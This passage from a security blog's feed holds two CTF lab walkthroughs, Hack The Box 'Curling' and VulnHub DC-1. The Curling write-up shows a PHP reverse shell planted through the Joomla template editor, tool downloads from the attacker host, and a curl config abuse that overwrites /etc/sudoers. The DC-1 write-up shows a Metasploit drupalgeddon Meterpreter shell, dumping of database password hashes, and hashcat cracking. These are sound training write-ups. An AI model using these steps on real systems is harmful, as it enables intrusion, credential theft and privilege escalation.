class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><blockquote><p>Modify these script and experiment with them.<br>It’s the best way to learn new things!</p></blockquote><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> Android Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> reverse engineering </tag>
            
            <tag> dynamic instrumentation </tag>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box - Curling Walkthrough</title>
      <link href="/2019/03/31/Hack-The-Box-Curling-Walkthrough/"/>
      <url>/2019/03/31/Hack-The-Box-Curling-Walkthrough/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="box.png" alt></p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>I haven’t really done any Hack The Box machine, but during the holidays I decided to root my first box. I wanted to try something easy and Linux based, so I chose “Curling”.</p><h2 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h2><p>I started with my usual fast scanning with nmap, which yielded the following result:</p><pre><code>➜  HTB nmap -A -F -sC 10.10.10.150Starting Nmap 7.60 ( https://nmap.org )Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 93.45% done; ETC: 10:16 (0:00:00 remaining)Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 99.27% done; ETC: 10:17 (0:00:00 remaining)Nmap scan report for 10.10.10.150Host is up (2.0s latency).Not shown: 98 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (EdDSA)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))| http-generator: Joomla! - Open Source Content Management| http-server-header: Apache/2.4.29 (Ubuntu)| http-title: HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>Well, it’s not much but good enough to start. Let’s go for the web server, where the Joomla CMS is hosted. Joomla had some famous SQL injection and other kinds vulnerabilities and I went for ‘joomscan’ to scan the URL.</p><pre><code>➜  HTB perl joomscan.pl -u http://10.10.10.150/____  _____  _____  __  __  ___   ___    __    _  _(_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( ).-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (\____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)  (1337.today)--=[OWASP JoomScan+---++---==[Version : 0.0.7+---++---==[Update Date : [2018/09/23]+---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo--=[Code name : Self Challenge@OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASPProcessing http://10.10.10.150/ ...[+] FireWall Detector[++] Firewall not detected[+] Detecting Joomla Version[++] Joomla 3.8.8[+] Core Joomla Vulnerability[++] Target Joomla core is not vulnerable[+] Checking Directory Listing[++] directory has directory listing :http://10.10.10.150/administrator/componentshttp://10.10.10.150/administrator/moduleshttp://10.10.10.150/administrator/templateshttp://10.10.10.150/images/banners[+] Checking apache info/status files[++] Readable info/status files are not found[+] admin finder[++] Admin page : http://10.10.10.150/administrator/[+] Checking robots.txt existing[++] robots.txt is not found[+] Finding common backup files name[++] Backup files are not found[+] Finding common log files name[++] error log is not found[+] Checking sensitive config.php.x file[++] Readable config files are not found</code></pre><p>Looks like this version is quite secure and I couldn’t find anything useful except the administrator page.</p><h2 id="Time-to-visit-the-site"><a href="#Time-to-visit-the-site" class="headerlink" title="Time to visit the site"></a>Time to visit the site</h2><p>I was presented with a very basic blog with 3 posts. Out of curiosity, I went to inspect the source code on the main page and I found a <code>secret.txt</code> comment at the bottom of the page.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    ... snip ..</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- secret.txt --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="The-secret-file"><a href="#The-secret-file" class="headerlink" title="The secret file"></a>The secret file</h2><p>It was a base64 encoded text, which looked like a password after decoding.</p><pre><code>➜  HTB curl 10.10.10.150/secret.txtQ3VybGluZzIwMTgh➜  HTB echo &quot;Q3VybGluZzIwMTgh&quot; | base64 -dCurling2018!</code></pre><h2 id="Finding-the-username"><a href="#Finding-the-username" class="headerlink" title="Finding the username"></a>Finding the username</h2><p>I went back to examine the blog posts and maybe gather something useful. I tried some possibilities for username like <code>curling20118</code>, <code>Super User</code>, <code>superuser</code>, <code>admin</code> etc.. Eventually, I found the correct username in the third post, which was <code>floris</code>.</p><pre><code>My first post of curling in 2018!Details    Written by Super User    Category: Uncategorised    Published: 22 May 2018    Hits: 7Hey this is the first post on this amazing website!Stay tuned for more amazing content! curling2018 for the win!- Floris</code></pre><h2 id="The-administrator-page"><a href="#The-administrator-page" class="headerlink" title="The administrator page"></a>The administrator page</h2><p>Since SSH didn’t work, I opened up the administrator page and logged in successfully. I was presented with a bunch of administrative stuff, but I knew my goal is to acquire a reverse shell. So, I downloaded a PHP reverse shell from the <a href="pentestmonkey.net">pentestmonkey.net</a> website and modified the host and port variables.</p><p>In the meanwhile, I found out that you can upload PHP files as part of the theme, so I went to the <code>Extensions -&gt; Templates -&gt; Templates</code> menu and selected the <code>protostar</code> template. Created a new PHP file and pasted the reverse shell code.</p><p>I fired up my netcat in listening mode on port 9696 and triggered my shell at <code>http://10.10.10.150/templates/protostar/gtfo.php</code>.</p><pre><code>➜  HTB nc -lvp 9696   Listening on [0.0.0.0] (family 0, port 9696)Connection from 10.10.10.150 46310 received!Linux curling 4.15.0-22-generic #24-Ubuntu x86_64 x86_64 x86_64 GNU/Linux 11:14:14 up 6 min,  2 users,  load average: 2.79, 1.11, 0.47USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATfloris   pts/0    10.10.14.90      11:08   45.00s  0.15s  0.15s -bashfloris   pts/1    10.10.15.223     11:09    3:57   2.28s  2.28s -bashuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&apos;t access tty; job control turned off$</code></pre><p>I didn’t even bother to spawn a pseudo TTY shell, just explored the machine a little bit. I found an interesting <code>password_backup</code> file in the home directory and I copied the content of the file to my local machine.</p><pre><code>$ cat password_backup00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&amp;SY...H..00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:400000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........400000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..&lt;~.x00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .&gt;...sVT.zH....100000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s.&quot;000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.000000f0: 819b bb48                                ...H</code></pre><h2 id="The-user-password"><a href="#The-user-password" class="headerlink" title="The user password"></a>The user password</h2><p>I figure, it’s a hex dump, so why not try to recover the data with <code>xxd</code>? My first try was <code>binwalk</code>, but it gave me an error, when I tried to extract the bz2 archive. Here is what I did to recover the password:</p><pre><code>➜  HTB xxd -r password_backup password_backup.bin➜  HTB file password_backup.binpassword_backup.bin: bzip2 compressed data, block size = 900k➜  HTB mv password_backup.bin password_backup.bz2➜  HTB mv password_backup original_password_backup➜  HTB bzip2 -d password_backup.bz2              ➜  HTB file password_backup    password_backup: gzip compressed data, was &quot;password&quot;➜  HTB mv password_backup password_backup.gz ➜  HTB gunzip -d password_backup.gz ➜  HTB file password_backuppassword_backup: bzip2 compressed data, block size = 900k➜  HTB mv password_backup password_backup.bz2➜  HTB bzip2 -d password_backup.bz2➜  HTB file password_backuppassword_backup: POSIX tar archive (GNU)➜  HTB mv password_backup password_backup.tar.gz➜  HTB tar xvf password_backup.tar.gz password.txt➜  HTB cat password.txt</code></pre><p>The password for SSH is:</p><blockquote><p>5d&lt;wdCbdZu)|hChXll</p></blockquote><h2 id="Logging-in-with-SSH"><a href="#Logging-in-with-SSH" class="headerlink" title="Logging in with SSH"></a>Logging in with SSH</h2><pre><code>➜  HTB ssh floris@10.10.10.150   floris@10.10.10.150&apos;s password:Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sun Jan  6 12:14:26 UTC 2019  System load:  0.14              Processes:            170  Usage of /:   46.2% of 9.78GB   Users logged in:      0  Memory usage: 22%               IP address for ens33: 10.10.10.150  Swap usage:   0%0 packages can be updated.0 updates are security updates.floris@curling:~$ cat user.txt</code></pre><p>The flag for the user is:</p><blockquote><p>65dd1df0713b40d88ead98cf11b8530b</p></blockquote><div class="addthis_tipjar_inline"></div><h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>Previously, I tried enumerating with <code>LinEnum.sh</code>, but no luck. There was an <code>admin-area</code> folder in the home directory and I thought, it must be the right way because of the permissions. I couldn’t figure out, how the <code>input</code> and <code>report</code> files are related to each other until I got a suggestion to check for running processes that are accessing these files.</p><p>I downloaded <code>pspy</code>, which turns out to be an excellent tool to monitor Linux processes without root access. After transferring the file, I executed it on the <code>admin-area</code> folder. I waited around 3-5 sec and an interesting process came up.</p><pre><code>floris@curling:~$ curl 10.10.15.233:8000/pspy64 -o pspy  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100 4364k  100 4364k    0     0   872k      0  0:00:05  0:00:05 --:--:--  897kfloris@curling:~$ chmod +x pspyfloris@curling:~$ ./pspy -d admin-area/... snip ...PID=3165   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportPID=3164   | /bin/sh -c sleep 1; cat /root/default.txt &gt; /home/floris/admin-area/inputPID=3163   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report... snip ...</code></pre><p>I read the curl man pages and <code>-K</code> switch is used for config files. This means curl can read parameters from the <code>input</code> file and the <code>report</code> file will be the result of the request.</p><pre><code>floris@curling:~/admin-area$ cat inputurl = &quot;file:///root/root.txt&quot;floris@curling:~/admin-area$ cat report</code></pre><p>The flag for root is:</p><blockquote><p>82c198ab6fc5365fdc6da2ee5c26064a</p></blockquote><h2 id="Getting-a-root-shell"><a href="#Getting-a-root-shell" class="headerlink" title="Getting a root shell"></a>Getting a root shell</h2><p>We are not satisfied with the flag, are we? Let’s get a root shell! If you check back to the curl man page, you can see that we can specify an output parameter.</p><pre><code># --- Example file ---#  this is a commenturl = &quot;example.com&quot;output = &quot;curlhere.html&quot;user-agent = &quot;superagent/1.0&quot;</code></pre><p>With this in mind, my plan was clear. I printed out the <code>/etc/sudoers</code> the same way I printed the root flag. I copied the content to my local web server and simply added floris below root.</p><pre><code>... snip ...# User privilege specificationroot    ALL=(ALL:ALL) ALLfloris  ALL=(ALL:ALL) ALL... snip ...</code></pre><p>I made the necessary changes in the input file.</p><pre><code>url = &quot;http://10.10.15.233:8000/sudoers&quot;output = &quot;/etc/sudoers&quot;</code></pre><p>After a couple of seconds, the request came in and I could easily switch to root with <code>sudo -s</code>.</p><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> CTF Walkthroughs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> walkthrough </tag>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1 Walkthrough</title>
      <link href="/2019/03/08/DC-1-Walkthrough/"/>
      <url>/2019/03/08/DC-1-Walkthrough/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="dc1.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn. To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p><p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners. There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this however, you will require root privileges. Depending on your skill level, you may be able to skip finding most of these flags and go straight for root. Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p><h2 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h2><p>I scanned every port <code>-p-</code> and ran default scripts with <code>-sC</code> as usual. I use the <code>-A</code> switch to enable OS detection, version detection, script scanning and traceroute. Here is the scan result:</p><pre><code>▲ ~ nmap -A -sC -p- 192.168.1.45Nmap scan report for DC-1 (192.168.1.45)Host is up (0.00021s latency).Not shown: 65531 closed portsPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)| ssh-hostkey:|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)80/tcp    open  http    Apache httpd 2.2.22 ((Debian))|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt|_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.2.22 (Debian)|_http-title: Welcome to Drupal Site | Drupal Site111/tcp   open  rpcbind 2-4 (RPC #100000)| rpcinfo:|   program version   port/proto  service|   100000  2,3,4        111/tcp  rpcbind|   100000  2,3,4        111/udp  rpcbind|   100024  1          44589/tcp  status|_  100024  1          54361/udp  status44589/tcp open  status  1 (RPC #100024)MAC Address: 08:00:27:DE:A5:8C (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.2 - 3.16Network Distance: 1 hop</code></pre><p>We have SSH, which is not vulnerable and it looks like we have a Drupal 7 CMS installation too. I tried <code>nikto</code> and  <code>dirb</code>, but they didn’t pick up anything useful.<br>So, I went on to check out the site and searched for version numbers. I also tried <code>admin - admin</code> on the login panel, but no luck.</p><h2 id="Getting-access"><a href="#Getting-access" class="headerlink" title="Getting access"></a>Getting access</h2><p>Some Drupal sites are vulnerable to drupalgeddon, which is basically an SQL injection vulnerability disclosed back in late 2014. I fired up my metasploit console and searched for <code>drupal</code>.</p><pre><code>msf5 &gt; search drupalMatching Modules================Name                                           Disclosure Date  Rank       Check  Description----                                           ---------------  ----       -----  -----------auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injectionauxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumerationexploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injectionexploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Executionexploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injectionexploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Executionexploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Executionmsf5 &gt; use exploit/multi/http/drupal_drupageddonmsf5 exploit(multi/http/drupal_drupageddon) &gt; show optionsModule options (exploit/multi/http/drupal_drupageddon):Name       Current Setting  Required  Description----       ---------------  --------  -----------Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]RHOSTS                      yes       The target address range or CIDR identifierRPORT      80               yes       The target port (TCP)SSL        false            no        Negotiate SSL/TLS for outgoing connectionsTARGETURI  /                yes       The target URI of the Drupal installationVHOST                       no        HTTP server virtual hostExploit target:Id  Name--  ----0   Drupal 7.0 - 7.31 (form-cache PHP injection method)msf5 exploit(multi/http/drupal_drupageddon) &gt;</code></pre><p>You can find more about this module on rapid7’s site: <a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon</a> I set the <code>rhosts</code> variable and simply typed <code>exploit</code>.</p><pre><code>msf5 exploit(multi/http/drupal_drupageddon) &gt; set rhosts 192.168.1.45rhosts =&gt; 192.168.1.45msf5 exploit(multi/http/drupal_drupageddon) &gt; exploit[*] Started reverse TCP handler on 192.168.1.134:4444[*] Sending stage (38247 bytes) to 192.168.1.45[*] Meterpreter session 1 opened (192.168.1.134:4444 -&gt; 192.168.1.45:38628)meterpreter &gt;</code></pre><p>This was easy, right? I typed <code>shell</code> to conveniently investigate the files and directories on the server.</p><pre><code>meterpreter &gt; shellProcess 3110 created.Channel 0 created.ls -latotal 188drwxr-xr-x  9 www-data www-data  4096 Feb 19 23:45 .drwxr-xr-x 12 root     root      4096 Feb 19 23:10 ..-rw-r--r--  1 www-data www-data   174 Nov 21  2013 .gitignore-rw-r--r--  1 www-data www-data  5767 Nov 21  2013 .htaccess-rw-r--r--  1 www-data www-data  1481 Nov 21  2013 COPYRIGHT.txt-rw-r--r--  1 www-data www-data  1451 Nov 21  2013 INSTALL.mysql.txt-rw-r--r--  1 www-data www-data  1874 Nov 21  2013 INSTALL.pgsql.txt-rw-r--r--  1 www-data www-data  1298 Nov 21  2013 INSTALL.sqlite.txt-rw-r--r--  1 www-data www-data 17861 Nov 21  2013 INSTALL.txt-rwxr-xr-x  1 www-data www-data 18092 Nov  1  2013 LICENSE.txt-rw-r--r--  1 www-data www-data  8191 Nov 21  2013 MAINTAINERS.txt-rw-r--r--  1 www-data www-data  5376 Nov 21  2013 README.txt-rw-r--r--  1 www-data www-data  9642 Nov 21  2013 UPGRADE.txt-rw-r--r--  1 www-data www-data  6604 Nov 21  2013 authorize.php-rw-r--r--  1 www-data www-data   720 Nov 21  2013 cron.php-rw-r--r--  1 www-data www-data    52 Feb 19 23:20 flag1.txtdrwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 includes-rw-r--r--  1 www-data www-data   529 Nov 21  2013 index.php-rw-r--r--  1 www-data www-data   703 Nov 21  2013 install.phpdrwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 miscdrwxr-xr-x 42 www-data www-data  4096 Nov 21  2013 modulesdrwxr-xr-x  5 www-data www-data  4096 Nov 21  2013 profiles-rw-r--r--  1 www-data www-data  1561 Nov 21  2013 robots.txtdrwxr-xr-x  2 www-data www-data  4096 Nov 21  2013 scriptsdrwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 sitesdrwxr-xr-x  7 www-data www-data  4096 Nov 21  2013 themes-rw-r--r--  1 www-data www-data 19941 Nov 21  2013 update.php-rw-r--r--  1 www-data www-data  2178 Nov 21  2013 web.config-rw-r--r--  1 www-data www-data   417 Nov 21  2013 xmlrpc.php</code></pre><p>The first flag is right in front of us, which contained the following hint:</p><blockquote><p>Every good CMS needs a config file - and so do you.</p></blockquote><p>The goal was pretty clear, I had to find a juicy config file. I just freely explored the directory to see, what I can find. In the <code>sites/default</code> directory, there was a <code>settings.php</code> file.</p><pre><code>cd sitesls -latotal 24drwxr-xr-x 4 www-data www-data 4096 Nov 21  2013 .drwxr-xr-x 9 www-data www-data 4096 Feb 19 23:45 ..-rw-r--r-- 1 www-data www-data  904 Nov 21  2013 README.txtdrwxr-xr-x 4 www-data www-data 4096 Nov 21  2013 alldr-xr-xr-x 3 www-data www-data 4096 Feb 19 23:48 default-rw-r--r-- 1 www-data www-data 2365 Nov 21  2013 example.sites.phpcd defaultls -latotal 52dr-xr-xr-x 3 www-data www-data  4096 Feb 19 23:48 .drwxr-xr-x 4 www-data www-data  4096 Nov 21  2013 ..-rw-r--r-- 1 www-data www-data 23202 Nov 21  2013 default.settings.phpdrwxrwxr-x 3 www-data www-data  4096 Feb 19 23:10 files-r--r--r-- 1 www-data www-data 15989 Feb 19 23:48 settings.php</code></pre><p>In the beginning of the file, there was a comment, which contained the second flag and below that I was presented with the username and password for the database.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren't the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$databases = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'default'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'default'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">'database'</span> =&gt; <span class="string">'drupaldb'</span>,</span><br><span class="line">      <span class="string">'username'</span> =&gt; <span class="string">'dbuser'</span>,</span><br><span class="line">      <span class="string">'password'</span> =&gt; <span class="string">'R0ck3t'</span>,</span><br><span class="line">      <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">      <span class="string">'port'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">      <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">      <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- snip --</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Brute force and dictionary attacks aren’t the only ways to gain access (and you WILL need access). What can you do with these credentials?</p></blockquote><h1 id="Accessing-the-database"><a href="#Accessing-the-database" class="headerlink" title="Accessing the database"></a>Accessing the database</h1><p>In order to log in to the database, we have to have a tty or pseudo-tty shell. At the moment, we have a very limited shell. Python was installed on the machine and all I had to do was:</p><pre><code>python -c &apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;$ </code></pre><p>I had everything to log in to the mysql database. I looked at the databases and selected the <code>drupaldb</code>.</p><pre><code>$ mysql -u dbuser -pEnter password: R0ck3tWelcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 69Server version: 5.5.60-0+deb7u1 (Debian)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;show databases;+--------------------+| Database           |+--------------------+| information_schema || drupaldb           |+--------------------+2 rows in set (0.00 sec)mysql&gt; use drupaldb;use drupaldb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt;</code></pre><p>Before making any queries, we have to know the table names. The result quite big, but I focused on the important one (the <code>users</code> table).</p><pre><code>mysql&gt; show tables;+-----------------------------+| Tables_in_drupaldb          |+-----------------------------+| actions                     || authmap                     || batch                       || block                       || block_custom                || block_node_type             || block_role                  || blocked_ips                 || cache                       || cache_block                 || cache_bootstrap             || cache_field                 || cache_filter                || cache_form                  || cache_image                 || cache_menu                  || cache_page                  || cache_path                  || cache_update                || cache_views                 || cache_views_data            || comment                     || ctools_css_cache            || ctools_object_cache         || date_format_locale          || date_format_type            || date_formats                || field_config                || field_config_instance       || field_data_body             || field_data_comment_body     || field_data_field_image      || field_data_field_tags       || field_revision_body         || field_revision_comment_body || field_revision_field_image  || field_revision_field_tags   || file_managed                || file_usage                  || filter                      || filter_format               || flood                       || history                     || image_effects               || image_styles                || menu_custom                 || menu_links                  || menu_router                 || node                        || node_access                 || node_comment_statistics     || node_revision               || node_type                   || queue                       || rdf_mapping                 || registry                    || registry_file               || role                        || role_permission             || search_dataset              || search_index                || search_node_links           || search_total                || semaphore                   || sequences                   || sessions                    || shortcut_set                || shortcut_set_users          || system                      || taxonomy_index              || taxonomy_term_data          || taxonomy_term_hierarchy     || taxonomy_vocabulary         || url_alias                   || users                       || users_roles                 || variable                    || views_display               || views_view                  || watchdog                    |+-----------------------------+80 rows in set (0.00 sec)mysql&gt;</code></pre><h2 id="Dumping-database-hashes"><a href="#Dumping-database-hashes" class="headerlink" title="Dumping database hashes"></a>Dumping database hashes</h2><p>The ran the following query to print out every entry in that specific table. I had to cut out some columns because the result was too long.</p><pre><code>mysql&gt; select * from users;+-----+-------+---------------------------------------------------------+-------------------+| uid | name  | pass                                                    | mail              |+-----+-------+---------------------------------------------------------+-------------------+|   0 |       |                                                         |                   ||   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com ||   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |+-----+-------+---------------------------------------------------------+-------------------+3 rows in set (0.00 sec)</code></pre><p>Well, drupal is also known to have very secure hashes. Are they secure enough? I let my 1070 TI GPU determine that. I downloaded <code>hashcat</code> to my Windows PC and the <code>rockyou.txt</code> word list.</p><pre><code>$ ./hashcat64.exe -m 7900 hashes.txt rockyou.txthashcat (v5.1.0) starting...OpenCL Platform #1: NVIDIA Corporation======================================* Device #1: GeForce GTX 1070 Ti, 2048/8192 MB allocatable, 19MCUHashes: 3 digests; 3 unique digests, 3 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Applicable optimizers:* Zero-Byte* Uses-64-BitMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Watchdog: Temperature abort trigger set to 90cDictionary cache built:* Filename..: rockyou.txt* Passwords.: 14344391* Bytes.....: 139921497* Keyspace..: 14344384* Runtime...: 2 secs$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR:53cr3tApproaching final keyspace - workload adjusted.Session..........: hashcatStatus...........: ExhaustedHash.Type........: Drupal7Hash.Target......: hashes.txtTime.Started.....: Fri Mar 08 09:19:57 2019 (7 mins, 52 secs)Time.Estimated...: Fri Mar 08 09:27:49 2019 (0 secs)Guess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:    36639 H/s (2.15ms) @ Accel:128 Loops:32 Thr:64 Vec:1Recovered........: 2/3 